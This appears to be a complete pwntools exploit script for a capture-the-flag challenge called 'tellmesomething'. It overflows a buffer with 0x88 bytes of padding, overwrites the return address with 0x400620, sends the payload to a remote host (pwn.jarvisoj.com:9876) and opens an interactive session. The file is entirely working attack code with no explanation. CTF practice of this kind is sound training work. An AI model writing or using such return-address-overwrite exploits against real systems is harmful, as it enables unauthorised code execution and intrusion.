from pwn import *

junk = "A" * 0x88
address = p64(0x400620)
payload = junk + address 

#Io=process('./tellmesomething')
Io=remote('pwn.jarvisoj.com',9876)
Io.write(payload)
Io.interactive()
